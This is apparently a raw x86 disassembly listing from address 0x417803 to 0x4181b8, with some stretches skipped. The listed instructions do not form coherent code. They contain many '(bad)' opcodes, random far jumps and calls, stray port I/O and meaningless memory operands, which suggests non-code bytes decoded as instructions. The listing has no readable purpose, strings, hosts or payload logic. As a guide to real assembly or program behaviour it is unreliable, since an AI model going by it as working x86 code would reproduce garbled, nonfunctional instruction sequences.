  417803:	or     eax,0xf874
  417808:	add    al,0x1
  41780a:	add    BYTE PTR [eax],al
  41780c:	mov    bl,BYTE PTR gs:[ebx]
  41780f:	daa    
  417810:	push   ds
  417811:	or     DWORD PTR [edi-0x506191d7],0x91876809
  41781b:	repz mov al,0x84
  41781e:	cmp    eax,esp
  417820:	pop    edi
  417821:	clc    
  417822:	or     BYTE PTR [edx-0x2cb1d77f],bl
  417828:	sbb    ecx,DWORD PTR [esi]
  41782a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41782b:	jle    0x417860
  41782d:	fmul   QWORD PTR [esi-0x2b]
  417830:	js     0x4177d8
  417832:	lods   eax,DWORD PTR ds:[esi]
  417833:	sub    DWORD PTR [ebx],edi
  417835:	pop    esp
  417836:	push   cs
  417837:	cmp    dl,dh
  417839:	sbb    al,BYTE PTR [ecx]
  41783b:	fcom   QWORD PTR [edi+0x646b5c56]
  417841:	fdiv   DWORD PTR [eax-0x59]
  417844:	mov    DWORD PTR [ecx+0x3c],edx
  417847:	cmp    al,0x50
  417849:	cwde   
  41784a:	mov    al,0x75
  41784c:	jnp    0x417856
  41784e:	stos   BYTE PTR es:[edi],al
  41784f:	inc    BYTE PTR [edx+0x26]
  417852:	loop   0x41787f
  417854:	or     edx,DWORD PTR [ebp+0x70]
  417857:	xor    DWORD PTR ds:[esi-0x42],edi
  41785b:	pop    ebx
  41785c:	push   ebx
  41785d:	xchg   ebp,eax
  41785e:	aam    0x4
  417860:	jo     0x41780f
  417862:	mov    esi,DWORD PTR [edi+0x66d41afb]
  417868:	test   DWORD PTR [ebx+esi*1],esi
  41786b:	jmp    0x417826
  41786d:	ds mov edx,0xf5f96a4e
  417873:	push   esi
  417874:	jl     0x4178d7
  417876:	and    ah,BYTE PTR [ebp+0x685ef426]
  41787c:	(bad)  
  41787d:	xchg   ecx,eax
  41787e:	pushf  
  41787f:	imul   edi,DWORD PTR [eax-0x9],0x8eec18c0
  417886:	outs   dx,DWORD PTR ds:[esi]
  417887:	call   0x6c820d98
  41788c:	adc    DWORD PTR [ecx+0x42fc9cc2],ebp
  417892:	mov    WORD PTR [ebp+ecx*8-0x50],gs
  417896:	daa    
  417897:	nop
  417898:	xchg   BYTE PTR [ebp-0x55],bh
  41789b:	call   DWORD PTR [ebx]
  41789d:	lock cmp dh,BYTE PTR [edi]
  4178a0:	je     0x417891
  4178a2:	adc    dl,BYTE PTR [ecx+0x51]
  4178a5:	scas   eax,DWORD PTR es:[edi]
  4178a6:	data16 stc 
  4178a8:	mov    BYTE PTR ds:0x1fbab34b,0x45
  4178af:	cdq    
  4178b0:	add    ch,BYTE PTR [ecx+0x38]
  4178b3:	jmp    0xcda4:0x58d65456
  4178ba:	jae    0x4178a5
  4178bc:	in     eax,0x81
  4178be:	adc    BYTE PTR [ebp-0x13b46451],dl
  4178c4:	add    al,0x3b
  4178c6:	aas    
  4178c7:	pop    ebx
  4178c8:	xlat   BYTE PTR ds:[ebx]
  4178c9:	add    al,ch
  4178cb:	test   al,0x28
  4178cd:	mov    ch,0x2a
  4178cf:	in     eax,dx
  4178d0:	js     0x417904
  4178d2:	cmc    
  4178d3:	sbb    eax,0x686fbbf
  4178d8:	jmp    0x6c80f1ce
  4178dd:	test   edi,ebx
  4178df:	inc    ecx
  4178e0:	xchg   edx,eax
  4178e1:	inc    esi
  4178e2:	fstp   DWORD PTR [esi+0x609230d1]
  4178e8:	xchg   BYTE PTR [ebp+0x3cd40ef7],dh
  4178ee:	es dec eax
  4178f0:	and    ebx,eax
  4178f2:	loope  0x4178f4
  4178f4:	pop    edi
  4178f5:	cmp    al,0x7b
  4178f7:	ret    0xa026
  4178fa:	push   edx
  4178fb:	call   0x3b6:0x3bc8f88d
  417902:	push   edx
  417903:	jae    0x4178a2
  417905:	dec    ebx
  417906:	jbe    0x4178f0
  417908:	cmp    edi,0x73
  41790b:	cli    
  41790c:	jne    0x417922
  41790e:	sbb    al,0x10
	...
  417974:	pop    eax
  417975:	inc    ecx
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	inc    ecx
  417981:	mov    eax,0xf978cdb9
  417986:	add    BYTE PTR [eax],al
  417988:	add    al,0x1
  41798a:	add    BYTE PTR [eax],al
  41798c:	into   
  41798d:	xchg   ebp,eax
  41798e:	out    0x7d,eax
  417990:	emms   
  417992:	sbb    DWORD PTR [ebx-0xe941a48],esp
  417998:	push   edi
  417999:	adc    al,0xcf
  41799b:	or     esi,DWORD PTR [esi+0x6516072a]
  4179a1:	jne    0x417954
  4179a3:	cmp    al,0xd2
  4179a5:	aam    0xc6
  4179a7:	push   ecx
  4179a8:	(bad)  
  4179a9:	in     al,dx
  4179aa:	les    eax,FWORD PTR [ebp-0x494a7633]
  4179b0:	push   0x6a
  4179b2:	pop    esp
  4179b3:	retf   0x1fae
  4179b6:	add    edi,DWORD PTR [edx+ecx*4]
  4179b9:	xchg   ecx,eax
  4179ba:	inc    esp
  4179bb:	out    0x33,eax
  4179bd:	out    dx,al
  4179be:	jp     0x41799f
  4179c0:	dec    eax
  4179c1:	pop    ebx
  4179c2:	in     eax,dx
  4179c3:	ja     0x417a1b
  4179c5:	add    eax,DWORD PTR [esi+0x7dcfcbbd]
  4179cb:	call   0xbb28:0xe4369bb0
  4179d2:	out    dx,eax
  4179d3:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4179d5:	inc    edi
  4179d6:	mov    ds:0x6ff42714,eax
  4179db:	daa    
  4179dc:	jmp    0xaf9b:0x1d7b9124
  4179e3:	add    ah,BYTE PTR [eax+ebx*8]
  4179e6:	fild   WORD PTR [ecx]
  4179e8:	pop    ds
  4179e9:	and    BYTE PTR [edx-0x70],bh
  4179ec:	push   ecx
  4179ed:	pop    ebp
  4179ee:	fadd   st,st(4)
  4179f0:	dec    esi
  4179f1:	sahf   
  4179f2:	sub    edx,DWORD PTR [esi+0x1a699967]
  4179f8:	retf   
  4179f9:	xchg   esp,eax
  4179fa:	outs   dx,BYTE PTR ds:[esi]
  4179fb:	pop    eax
  4179fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179fd:	js     0x417989
  4179ff:	jns    0x4179cd
  417a01:	call   0x60ff3f70
  417a06:	sub    bh,BYTE PTR [ebp+0x55]
  417a09:	aam    0x1c
  417a0b:	cli    
  417a0c:	sub    eax,0xf76a4123
  417a11:	imul   ebp,esp,0xffffffb0
  417a14:	int3   
  417a15:	arpl   dx,si
  417a17:	scas   eax,DWORD PTR es:[edi]
  417a18:	sbb    ebx,edi
  417a1a:	jp     0x417a82
  417a1c:	sbb    BYTE PTR [eax+0x74],ah
  417a1f:	fwait
  417a20:	push   esp
  417a21:	and    BYTE PTR [edi],0x5e
  417a24:	mov    esi,0x9d2531b6
  417a29:	or     al,0xe6
  417a2b:	sub    BYTE PTR [ecx-0x54],bh
  417a2e:	frstor [ebx-0x119b568]
  417a34:	push   ecx
  417a35:	loopne 0x417a43
  417a37:	xchg   ecx,eax
  417a38:	xlat   BYTE PTR ds:[ebx]
  417a39:	adc    ebp,DWORD PTR [ecx]
  417a3b:	and    dl,BYTE PTR [ebx+0x5b]
  417a3e:	in     eax,0xd
  417a40:	sub    BYTE PTR [ecx],dl
  417a42:	test   bl,cl
  417a44:	mov    al,0x31
  417a46:	pop    eax
  417a47:	clc    
  417a48:	xor    ch,0x5
  417a4b:	or     ch,ch
  417a4d:	cmp    BYTE PTR [edi+0x23],dl
  417a50:	push   0x42c80064
  417a55:	sub    DWORD PTR [ecx+0x49],esi
  417a58:	sub    bh,BYTE PTR [edi+0xa]
  417a5b:	int3   
  417a5c:	sub    al,0xf3
  417a5e:	hlt    
  417a5f:	aad    0x4a
  417a61:	sub    eax,0x75cadb5a
  417a66:	mov    al,ds:0x42d8385f
  417a6c:	push   ebp
  417a6d:	pop    esp
  417a6e:	mov    ds:0x35ab9e94,al
  417a73:	mov    bh,BYTE PTR [ecx+0x2a]
  417a76:	cmc    
  417a77:	in     al,0xde
  417a79:	addr16 pop es
  417a7b:	pop    esi
  417a7c:	mov    ah,al
  417a7e:	mov    ah,0x8b
  417a80:	mov    ebx,0x8351d38b
  417a85:	inc    edi
  417a86:	mov    eax,ebx
  417a88:	imul   esi,ecx,0x56e88116
  417a8e:	iret   
  417a8f:	in     al,dx
	...
  417af4:	das    
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx-0x1a1e9398]
  417b04:	jl     0x417b00
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    al,0x1
  417b0a:	add    BYTE PTR [eax],al
  417b0c:	outs   dx,BYTE PTR ds:[esi]
  417b0d:	inc    esi
  417b0e:	push   edx
  417b0f:	pop    edx
  417b10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b11:	xor    BYTE PTR [esi-0x40],bl
  417b14:	outs   dx,BYTE PTR ds:[esi]
  417b15:	inc    edi
  417b16:	mov    al,dl
  417b18:	mov    eax,0x4fce00c2
  417b1d:	loop   0x417ad2
  417b1f:	adc    al,0x8f
  417b21:	add    ebp,DWORD PTR [edx+esi*8]
  417b24:	xor    al,0xce
  417b26:	dec    edx
  417b27:	ret    0xa20e
  417b2a:	popa   
  417b2b:	pop    es
  417b2c:	sub    BYTE PTR [edx+ecx*2],ah
  417b2f:	outs   dx,BYTE PTR ds:[esi]
  417b30:	or     ebx,esp
  417b32:	or     edx,DWORD PTR [edi-0x35dd7c22]
  417b38:	push   0x10
  417b3a:	jl     0x417bba
  417b3c:	lahf   
  417b3d:	mov    WORD PTR [edi],es
  417b3f:	or     ah,BYTE PTR [edi-0x5b1d133b]
  417b45:	(bad)  
  417b46:	mov    ebp,esp
  417b48:	xchg   ecx,eax
  417b49:	push   cs
  417b4a:	cmp    ch,BYTE PTR [ecx-0x5b]
  417b4d:	push   cs
  417b4e:	dec    ecx
  417b4f:	aas    
  417b50:	(bad)
  417b54:	scas   eax,DWORD PTR es:[edi]
  417b55:	fucomip st,st(2)
  417b57:	mov    ah,0x86
  417b59:	daa    
  417b5a:	popf   
  417b5b:	lods   eax,DWORD PTR ds:[esi]
  417b5c:	out    dx,eax
  417b5d:	jbe    0x417b26
  417b5f:	into   
  417b60:	xor    DWORD PTR [edx+esi*2],esp
  417b63:	in     eax,dx
  417b64:	jmp    0x58369a21
  417b69:	mov    ds:0x3ec9277b,al
  417b6e:	inc    esi
  417b6f:	scas   al,BYTE PTR es:[edi]
  417b70:	neg    BYTE PTR [eax+0x2f]
  417b73:	adc    BYTE PTR [ebx],bl
  417b75:	loopne 0x417bd2
  417b77:	in     al,dx
  417b78:	dec    ebp
  417b79:	xchg   ebx,eax
  417b7a:	sbb    ebx,DWORD PTR [esi-0x753dc2df]
  417b80:	mov    WORD PTR [edx+0x6c7ac09b],cs
  417b86:	repnz ds adc eax,0x627dc1a3
  417b8d:	bound  edi,QWORD PTR [eax+esi*4]
  417b90:	pusha  
  417b91:	adc    al,0xd1
  417b93:	outs   dx,DWORD PTR ds:[esi]
  417b94:	ja     0x417bd0
  417b96:	in     al,dx
  417b97:	sbb    ah,BYTE PTR [eax+0x75766fde]
  417b9d:	xor    edx,DWORD PTR [edi]
  417b9f:	call   0x160c:0xb5bb38e8
  417ba6:	jecxz  0x417bc9
  417ba8:	outs   dx,BYTE PTR ds:[esi]
  417ba9:	aas    
  417baa:	or     eax,0x567e9030
  417baf:	sub    al,0x75
  417bb1:	cmp    dh,BYTE PTR [edx-0x1068090c]
  417bb7:	jmp    0x417b52
  417bb9:	aad    0x7c
  417bbb:	mov    dl,0x24
  417bbd:	(bad)  
  417bbe:	psrad  mm4,mm6
  417bc1:	je     0x417c01
  417bc3:	xchg   ebx,eax
  417bc4:	mov    bh,0x5c
  417bc6:	or     bh,0x38
  417bc9:	call   0x4def:0xcfe90087
  417bd0:	and    eax,0xb39f74d5
  417bd5:	lods   eax,DWORD PTR ds:[esi]
  417bd6:	stos   DWORD PTR es:[edi],eax
  417bd7:	je     0x417c13
  417bd9:	cmp    dl,bl
  417bdb:	fwait
  417bdc:	pop    es
  417bdd:	jg     0x417b6d
  417bdf:	cmc    
  417be0:	enter  0x6f99,0xbf
  417be4:	stos   DWORD PTR es:[edi],eax
  417be5:	rol    edx,0x5b
  417be8:	xor    bl,BYTE PTR [ecx+edi*2+0x65]
  417bec:	mov    dh,BYTE PTR [ecx]
  417bee:	dec    edi
  417bef:	jbe    0x417bf7
  417bf1:	and    ebp,edx
  417bf3:	xor    BYTE PTR [ebx-0x45de3876],ah
  417bf9:	sub    BYTE PTR [esi+0x2e],0x2f
  417bfd:	into   
  417bfe:	add    al,0xe8
  417c00:	cmp    DWORD PTR [edi],ecx
  417c02:	xor    al,0x8c
  417c04:	mov    bl,0x9
  417c06:	call   0x39a3:0xb45aa51d
  417c0d:	fadd   st,st(5)
  417c0f:	inc    ebp
	...
  417c74:	mov    eax,eax
  417c76:	nop
  417c77:	test   cl,bl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0xe1
  417c81:	(bad)  
  417c82:	mov    cl,0x38
  417c84:	cmp    bl,0x0
  417c87:	add    BYTE PTR [ecx+eax*1],al
  417c8a:	add    BYTE PTR [eax],al
  417c8c:	jl     0x417c73
  417c8e:	xor    DWORD PTR [esi+edx*8-0x4b],esp
  417c92:	sbb    eax,0x3cef6d6b
  417c97:	call   DWORD PTR [ecx+0x22cfa00b]
  417c9d:	mov    eax,ds:0x5abeed7a
  417ca2:	outs   dx,BYTE PTR ds:[esi]
  417ca3:	test   DWORD PTR [edx-0x34],edx
  417ca6:	inc    esi
  417ca7:	gs mov edx,0x2bb12dea
  417cad:	imul   eax,ebp,0xffffffb1
  417cb0:	jno    0x417cf1
  417cb2:	fs dec ebx
  417cb4:	and    al,0x5e
  417cb6:	call   0x6f2c9ebd
  417cbb:	or     BYTE PTR ds:0xfd52c54a,ah
  417cc1:	inc    eax
  417cc2:	mov    WORD PTR [edx+0x47475cf2],fs
  417cc8:	sub    al,0xa4
  417cca:	in     eax,0x39
  417ccc:	out    0x97,al
  417cce:	mov    ds:0x1770fa13,al
  417cd3:	scas   al,BYTE PTR es:[edi]
  417cd4:	sbb    eax,0xad805ff2
  417cd9:	xchg   edi,eax
  417cda:	sbb    esp,eax
  417cdc:	sbb    al,al
  417cde:	and    ecx,0x54
  417ce1:	pop    ebx
  417ce2:	jb     0x417cd4
  417ce4:	lea    edi,[ebp+0x3f7cf468]
  417cea:	sub    BYTE PTR [edi],ah
  417cec:	daa    
  417ced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cee:	mov    cl,0xf3
  417cf0:	push   ebx
  417cf2:	cmp    eax,0xcf29b191
  417cf7:	mov    al,0xf9
  417cf9:	mov    al,BYTE PTR [ebx+0x19]
  417cfc:	rcr    BYTE PTR [ebp+0x37],cl
  417cff:	(bad)  
  417d00:	or     ebp,DWORD PTR [ecx-0x14]
  417d03:	inc    ebp
  417d04:	sub    eax,0xec55dbbf
  417d09:	mov    DWORD PTR [ebx+0x3cfd4803],esp
  417d0f:	mov    ah,0xee
  417d11:	sti    
  417d12:	iret   
  417d13:	hlt    
  417d14:	into   
  417d15:	not    dl
  417d17:	push   DWORD PTR [edi]
  417d19:	stos   BYTE PTR es:[edi],al
  417d1a:	xchg   esi,eax
  417d1b:	test   al,0x21
  417d1d:	xchg   BYTE PTR cs:[eax],bh
  417d20:	mov    DWORD PTR [edi],esi
  417d22:	rol    DWORD PTR [ebx],1
  417d24:	inc    esp
  417d25:	nop
  417d26:	jle    0x417ceb
  417d28:	icebp  
  417d29:	retf   
  417d2a:	dec    esi
  417d2b:	fstp   TBYTE PTR [edi+0x26]
  417d2e:	fild   WORD PTR [ebx+ebx*4]
  417d31:	adc    eax,DWORD PTR [edi]
  417d33:	call   0x3fda0f5a
  417d38:	(bad)  [edi+0x3877a4df]
  417d3e:	aam    0x6c
  417d40:	in     eax,dx
  417d41:	add    eax,0xbde68278
  417d46:	and    edi,eax
  417d48:	jmp    0x2933:0x706ca2cd
  417d4f:	(bad)  
  417d50:	(bad)  
  417d52:	lods   eax,DWORD PTR ds:[esi]
  417d53:	mov    edi,0x8f516ff9
  417d58:	push   ecx
  417d59:	cld    
  417d5a:	jb     0x417d5e
  417d5c:	lods   al,BYTE PTR ds:[esi]
  417d5d:	or     ebp,esp
  417d5f:	mov    gs,WORD PTR [ecx-0x10]
  417d62:	mov    esp,0xf71879b3
  417d67:	je     0x417d6b
  417d69:	xor    al,0x35
  417d6b:	push   ebx
  417d6c:	je     0x417d8c
  417d6e:	mov    bh,0xfe
  417d70:	(bad)  
  417d71:	push   esi
  417d72:	xor    DWORD PTR [ecx+0x6aaf8827],edi
  417d78:	push   ebp
  417d79:	cmp    esi,ebp
  417d7b:	fsub   QWORD PTR ds:0x21720762
  417d81:	mov    ebp,DWORD PTR [ebx-0x62f0bd69]
  417d87:	bnd jl 0x417dd1
  417d8a:	xlat   BYTE PTR ds:[ebx]
  417d8b:	lods   eax,DWORD PTR ds:[esi]
  417d8c:	out    0x34,al
  417d8e:	xor    al,0xcf
	...
  417df4:	pop    ss
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	(bad)
  417e03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e04:	test   ah,bh
  417e06:	add    BYTE PTR [eax],al
  417e08:	add    al,0x1
  417e0a:	add    BYTE PTR [eax],al
  417e0c:	xor    eax,0xdf245628
  417e11:	pushf  
  417e12:	out    0x65,eax
  417e14:	popa   
  417e15:	and    ah,ah
  417e17:	mov    ch,0x8
  417e19:	dec    ebx
  417e1a:	mov    DWORD PTR [ecx+0x26],ebp
  417e1d:	(bad)  
  417e1e:	jp     0x417e28
  417e20:	xlat   BYTE PTR ds:[ebx]
  417e21:	ja     0x417e33
  417e23:	mov    ch,0xd0
  417e25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e26:	imul   edx,edi,0xfd6a1b49
  417e2c:	arpl   si,di
  417e2e:	xchg   edi,eax
  417e2f:	xchg   esp,eax
  417e30:	push   cs
  417e31:	xchg   esi,eax
  417e32:	pushf  
  417e33:	push   ebx
  417e34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e35:	mov    al,0xa0
  417e37:	pop    ebp
  417e38:	outs   dx,BYTE PTR ds:[esi]
  417e39:	cld    
  417e3a:	and    dl,BYTE PTR [ebx]
  417e3c:	jg     0x417eaa
  417e3e:	loope  0x417eb1
  417e40:	jae    0x417e66
  417e42:	inc    esi
  417e43:	adc    eax,ebp
  417e45:	sub    al,BYTE PTR [edi-0x3a959822]
  417e4b:	xchg   esp,eax
  417e4c:	scas   eax,DWORD PTR es:[edi]
  417e4d:	mov    esi,ds
  417e4f:	scas   eax,DWORD PTR es:[edi]
  417e50:	je     0x417e86
  417e52:	call   0xfcd5:0x5b3098d2
  417e59:	sbb    esp,eax
  417e5b:	(bad)  
  417e5c:	mov    ds:0x4cd92e2a,al
  417e61:	in     eax,0xec
  417e63:	push   ebp
  417e64:	(bad)  
  417e65:	in     al,dx
  417e66:	jns    0x417de9
  417e68:	hlt    
  417e69:	mov    al,BYTE PTR [edx]
  417e6b:	fs fs dec esp
  417e6e:	xor    DWORD PTR [eax+0x14],esp
  417e71:	xlat   BYTE PTR ds:[ebx]
  417e72:	push   ecx
  417e73:	test   DWORD PTR [ebx+eax*2-0x4925c8a2],ebx
  417e7a:	je     0x417e34
  417e7c:	test   al,0x98
  417e7e:	aam    0x34
  417e80:	xchg   edx,eax
  417e81:	and    esp,edi
  417e83:	mov    ?,WORD PTR [edx-0x2]
  417e86:	xchg   edi,eax
  417e87:	cmp    BYTE PTR [edi],cl
  417e89:	adc    DWORD PTR [ebx+0x696e5261],esi
  417e8f:	inc    ebx
  417e90:	(bad)  
  417e91:	pop    ebp
  417e92:	retf   0xb2a5
  417e95:	mov    dh,0x35
  417e97:	clc    
  417e98:	lahf   
  417e99:	div    bl
  417e9b:	xor    al,0xb8
  417e9d:	jmp    0x417efe
  417e9f:	pop    esp
  417ea0:	dec    esp
  417ea1:	ja     0x417ee6
  417ea3:	sbb    ch,cl
  417ea5:	sub    BYTE PTR [edx+edx*4-0x55],al
  417ea9:	mov    WORD PTR [esi-0x42e86eb4],ss
  417eaf:	push   eax
  417eb0:	das    
  417eb1:	jno    0x417efd
  417eb3:	shr    BYTE PTR [edx+0x76fc223d],cl
  417eb9:	je     0x417e62
  417ebb:	shl    DWORD PTR [edi+0x4f8e27b3],0x67
  417ec2:	sbb    al,0xc5
  417ec4:	loope  0x417f37
  417ec6:	mov    dl,0x49
  417ec8:	outs   dx,BYTE PTR ds:[esi]
  417ec9:	push   ecx
  417eca:	outs   dx,BYTE PTR ds:[esi]
  417ecb:	cmp    al,0xd1
  417ecd:	push   ebp
  417ece:	xchg   edi,eax
  417ecf:	xchg   esi,eax
  417ed0:	outs   dx,BYTE PTR ds:[esi]
  417ed1:	jmp    0x5c73:0xb2f361ec
  417ed8:	add    al,0x2e
  417eda:	and    DWORD PTR [edi-0x7f],esp
  417edd:	push   esi
  417ede:	push   esi
  417edf:	aas    
  417ee0:	nop
  417ee1:	push   cs
  417ee2:	cli    
  417ee3:	dec    edi
  417ee4:	loope  0x417f17
  417ee6:	push   0xbee55f0c
  417eeb:	cmp    al,BYTE PTR [ebx]
  417eed:	inc    esi
  417eee:	push   ebx
  417eef:	sbb    eax,0x754867c9
  417ef4:	leave  
  417ef5:	outs   dx,DWORD PTR ds:[esi]
  417ef6:	into   
  417ef7:	push   0xf4c59318
  417efc:	mov    al,ds:0x81d3fb86
  417f01:	dec    esp
  417f02:	and    eax,0xd2a08206
  417f08:	pop    ebx
  417f09:	sahf   
  417f0a:	jne    0x417eaf
  417f0c:	adc    cl,BYTE PTR [eax+edi*4]
  417f0f:	hlt    
	...
  417f74:	(bad)  
  417f75:	out    0xe6,al
  417f77:	cmp    esp,esi
  417f79:	cmp    edi,edi
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	fld    QWORD PTR [ecx]
  417f82:	mov    bl,0x27
  417f84:	mov    ch,bh
  417f86:	add    BYTE PTR [eax],al
  417f88:	add    al,0x1
  417f8a:	add    BYTE PTR [eax],al
  417f8c:	cmc    
  417f8d:	aam    0x4d
  417f8f:	lods   al,BYTE PTR ds:[esi]
  417f90:	sub    bl,BYTE PTR [ecx+0x44]
  417f93:	out    0x3d,eax
  417f95:	pop    esi
  417f96:	xchg   ecx,eax
  417f97:	nop
  417f98:	cmc    
  417f99:	cmp    al,0xc0
  417f9b:	push   ss
  417f9c:	sbb    DWORD PTR [ecx+ebp*2-0x77a81165],0xffffffb4
  417fa4:	sub    BYTE PTR [ecx],ah
  417fa6:	cmp    BYTE PTR [ecx],bh
  417fa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fa9:	(bad)  
  417fab:	sbb    BYTE PTR [ebp-0x1],0x31
  417faf:	stos   BYTE PTR es:[edi],al
  417fb0:	cmp    BYTE PTR [ebx-0x27],0x98
  417fb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fb5:	mov    gs,WORD PTR [edi]
  417fb7:	enter  0xdbb6,0x8d
  417fbb:	sbb    eax,0xea949f71
  417fc0:	add    ch,bl
  417fc2:	mov    eax,ds:0xa02a41b
  417fc7:	enter  0xac62,0xed
  417fcb:	dec    ecx
  417fcc:	and    DWORD PTR [ebx+0x7a],eax
  417fcf:	rol    ecx,cl
  417fd1:	ret    
  417fd2:	dec    edx
  417fd3:	in     eax,dx
  417fd4:	pop    es
  417fd5:	call   0x457f1af6
  417fda:	mov    eax,ds:0xd37efac5
  417fdf:	fistp  QWORD PTR [edx+0x54]
  417fe2:	test   edx,ebp
  417fe4:	in     al,dx
  417fe5:	mov    eax,ds:0x19c14e5e
  417fea:	pop    ecx
  417feb:	pop    edx
  417fec:	xchg   ebx,eax
  417fed:	dec    esi
  417fee:	ret    
  417fef:	adc    bh,BYTE PTR [ecx-0x41]
  417ff2:	xor    edi,eax
  417ff4:	outs   dx,DWORD PTR ds:[esi]
  417ff5:	push   0xc9cf823a
  417ffa:	pop    es
  417ffb:	push   esi
  417ffc:	jbe    0x418064
  417ffe:	popf   
  417fff:	aaa    
  418000:	fiadd  DWORD PTR [esi]
  418002:	test   ah,dh
  418004:	jb     0x417fe7
  418006:	cmp    al,0x45
  418008:	mov    edi,0xb61e841c
  41800d:	call   0x9a31c68c
  418012:	mov    ch,0x34
  418014:	pop    ds
  418015:	test   al,0x68
  418017:	cmp    BYTE PTR [ecx],ch
  418019:	mov    al,0x7b
  41801b:	adc    ecx,ebx
  41801d:	or     BYTE PTR [edi+edx*8+0x10de4fbf],0xdf
  418025:	xchg   esi,eax
  418026:	sub    eax,0xc0471a88
  41802b:	dec    ebp
  41802c:	clc    
  41802d:	xor    edx,edi
  41802f:	je     0x418065
  418031:	or     al,0x2e
  418033:	outs   dx,DWORD PTR ds:[esi]
  418034:	test   DWORD PTR [edx],esp
  418036:	js     0x417ff6
  418038:	dec    edx
  418039:	sub    dl,BYTE PTR [esi]
  41803b:	fucomip st,st(4)
  41803d:	mov    al,ds:0x9fa65706
  418042:	sti    
  418043:	sub    BYTE PTR [esi-0x12],0xc3
  418047:	pop    eax
  418048:	push   ebx
  418049:	inc    ebx
  41804a:	leave  
  41804b:	aaa    
  41804c:	in     al,dx
  41804d:	rcl    DWORD PTR [edi],cl
  41804f:	div    DWORD PTR fs:[ecx+0x68]
  418053:	sub    ebp,DWORD PTR [edi+0x2cda5098]
  418059:	add    al,0x62
  41805b:	add    edi,DWORD PTR [ecx-0x73]
  41805e:	repz dec esp
  418060:	add    al,0xd3
  418062:	gs ret 
  418064:	mov    edx,0x40afb05c
  418069:	inc    esi
  41806a:	sub    eax,0x335e9476
  41806f:	ret    0x37ca
  418072:	daa    
  418073:	pop    ds
  418074:	adc    BYTE PTR [ebp+0x29],ah
  418077:	xlat   BYTE PTR gs:[ebx]
  418079:	xor    ebp,0xf888984c
  41807f:	xor    eax,0x7884417f
  418084:	fst    DWORD PTR cs:[ebx+eiz*4]
  418088:	sbb    DWORD PTR [edx+edi*8],0xe799fb95
  41808f:	jae    0x418091
	...
  4180f1:	add    BYTE PTR [eax],al
  4180f3:	add    BYTE PTR [ecx-0xba9482],ch
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0xac2fdebc,eax
  418101:	push   cs
  418102:	xor    DWORD PTR [ebx+0xfe8c],ecx
  418108:	add    al,0x1
  41810a:	add    BYTE PTR [eax],al
  41810c:	sbb    al,0x34
  41810e:	xchg   ebx,eax
  41810f:	push   esp
  418110:	scas   eax,DWORD PTR es:[edi]
  418111:	fwait
  418112:	into   
  418113:	mov    ah,0x58
  418115:	sbb    ebx,0x87b3b823
  41811b:	loope  0x41812c
  41811d:	mov    eax,ds:0x638d6f2d
  418122:	ja     0x418182
  418124:	hlt    
  418125:	push   edi
  418126:	ret    0x90aa
  418129:	or     eax,DWORD PTR [edx-0x5c8bc391]
  41812f:	inc    esi
  418130:	xchg   ebx,eax
  418131:	mov    ds:0x500b999f,eax
  418136:	shr    BYTE PTR [edi+0x292fdbdb],0xbc
  41813d:	mov    ds:0x3c6aaf78,eax
  418142:	push   eax
  418143:	bound  edi,QWORD PTR [ebx+0xcbc542b]
  418149:	loope  0x4181bb
  41814b:	sbb    cl,BYTE PTR [edx+0x6e]
  41814e:	(bad)  
  41814f:	sti    
  418150:	adc    ebp,DWORD PTR [edx+ebp*1-0x48]
  418154:	les    edx,FWORD PTR [ecx]
  418156:	pop    eax
  418157:	sar    DWORD PTR [ebx+0x58],1
  41815a:	add    eax,DWORD PTR [ebx]
  41815c:	popa   
  41815d:	push   0xffffffbb
  41815f:	or     al,0x9c
  418161:	dec    ebx
  418162:	clc    
  418163:	outs   dx,DWORD PTR ds:[esi]
  418164:	and    eax,0xecf092bb
  418169:	icebp  
  41816a:	adc    eax,0xcc7a8f1
  41816f:	leave  
  418170:	mov    dh,0xbd
  418172:	cmp    DWORD PTR [esi-0x73],ecx
  418175:	mov    bp,0x256c
  418179:	jmp    0x418136
  41817b:	out    0xd7,eax
  41817d:	retf   0x9a5e
  418180:	out    0x79,al
  418182:	xor    DWORD PTR [ebp+0x2910e3a5],esi
  418188:	loope  0x4181b3
  41818a:	frstor [esi-0x7a]
  41818d:	push   edx
  41818e:	pop    ds
  41818f:	adc    BYTE PTR [edx],0x5
  418192:	add    eax,0x1e4dfcb5
  418197:	dec    eax
  418198:	sub    ch,BYTE PTR [ebp+0xb]
  41819b:	scas   al,BYTE PTR es:[edi]
  41819c:	lahf   
  41819d:	shr    DWORD PTR [edx+0x7e],cl
  4181a0:	lahf   
  4181a1:	mov    WORD PTR [edx-0x8],?
  4181a4:	pop    ds
  4181a5:	and    eax,0x37106d3e
  4181aa:	cmp    DWORD PTR [edi-0x3e0cc90b],esp
  4181b0:	repz push eax
  4181b2:	mov    edi,DWORD PTR [edi+0x29]
  4181b5:	ret    0x862c
  4181b8:	bound  edx,QWORD PTR [edi+edx*4-0x5]
